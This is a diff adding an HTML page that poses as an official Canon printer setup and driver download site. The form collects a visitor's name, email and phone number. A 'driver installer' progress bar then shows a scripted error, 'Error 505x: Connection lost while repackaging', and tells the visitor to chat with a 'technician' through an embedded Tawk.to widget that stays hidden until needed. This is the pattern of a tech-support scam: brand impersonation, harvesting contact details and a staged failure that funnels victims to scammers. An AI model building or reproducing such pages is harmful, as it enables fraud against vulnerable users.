@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Printer Setup And Installation</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+</head>
+<body class="setup-page">
+    <div class="setup-container">
+        
+        <!-- Left Side: Form and Interactions -->
+        <div class="left-panel">
+            <h1 class="main-title">Canon Printer Setup<br>And Installation</h1>
+            
+            <ul class="feature-list" id="feature-list">
+                <li><span class="check">✓</span> Connect printer to WiFi</li>
+                <li><span class="check">✓</span> Download printer drivers</li>
+                <li><span class="check">✓</span> Printer offline fix</li>
+                <li><span class="check">✓</span> New printer setup</li>
+            </ul>
+
+            <div class="form-card" id="form-container">
+                <h2>Enter details to setup printer</h2>
+                <form id="setup-form">
+                    <div class="input-group">
+                        <label for="fullName">Full Name</label>
+                        <input type="text" id="fullName" name="fullName" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="printerModel">Printer Model</label>
+                        <input type="text" id="printerModel" name="printerModel" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="email">Email *</label>
+                        <input type="email" id="email" name="email" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="phone">Phone Number *</label>
+                        <input type="tel" id="phone" name="phone" pattern="\d{10}" maxlength="10" title="Please enter exactly 10 digits" required>
+                    </div>
+
+                    <button type="submit" class="submit-btn" id="submit-btn">
+                        <span id="btn-text">Submit Details</span>
+                        <div class="spinner" id="btn-spinner" style="display: none;"></div>
+                    </button>
+                </form>
+            </div>
+
+            <!-- Download Section (Hidden initially) -->
+            <div class="download-section" id="download-section" style="display: none;">
+                <h2>Download Canon Printer Drivers</h2>
+                <p>Please wait while we prepare your files...</p>
+                <button id="start-download-btn" class="download-btn">Download Drivers</button>
+                
+                <div class="progress-container" id="progress-container" style="display: none;">
+                    <h3>Canon Drivers Software Installer</h3>
+                    <div class="progress-bar-bg">
+                        <div class="progress-bar-fill" id="progress-bar-fill"></div>
+                    </div>
+                    <span class="progress-text" id="progress-text">0%</span>
+                    
+                    <div class="error-message" id="error-message" style="display: none;">
+                        <p class="error-code">Error 505x: Connection lost while repackaging.</p>
+                        <p class="error-action">Please chat to our technician for help.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Side: Image -->
+        <div class="right-panel">
+            <!-- Using a high quality placeholder for the printer image -->
+            <img src="https://images.unsplash.com/photo-1612815154858-60aa4c59eaa6?q=80&w=1000&auto=format&fit=crop" alt="Printer" class="printer-img">
+        </div>
+    </div>
+
+    <!-- Custom Chat Icon -->
+    <div id="custom-chat-btn" class="custom-chat-btn">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3C6.48 3 2 6.8 2 11.5c0 2.76 1.54 5.2 3.92 6.74-.24 1.45-.88 3.03-.92 3.14-.07.19-.01.41.13.54.14.13.36.14.53.05 3.32-1.78 5.24-2.6 6.09-2.82.41.04.83.05 1.25.05 5.52 0 10-3.8 10-8.5S17.52 3 12 3z"/></svg>
+    </div>
+
+    <!-- Tawk.to Script -->
+    <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    // Configure Tawk.to to stay hidden initially
+    Tawk_API.onLoad = function(){
+        Tawk_API.hideWidget();
+    };
+    Tawk_API.onChatMinimized = function(){
+        Tawk_API.hideWidget();
+        document.getElementById('custom-chat-btn').style.display = 'flex';
+    };
+    Tawk_API.onChatMaximized = function(){
+        document.getElementById('custom-chat-btn').style.display = 'none';
+        document.getElementById('custom-chat-btn').classList.remove('bounce-animation');
+    };
+    
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    // NOTE: User needs to replace this URL with their actual Tawk.to direct chat link property ID
+    s1.src='https://embed.tawk.to/65d12345abcdef1234567890/1hm7890ab'; 
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script>
+    <script src="script.js"></script>
+</body>
+</html>
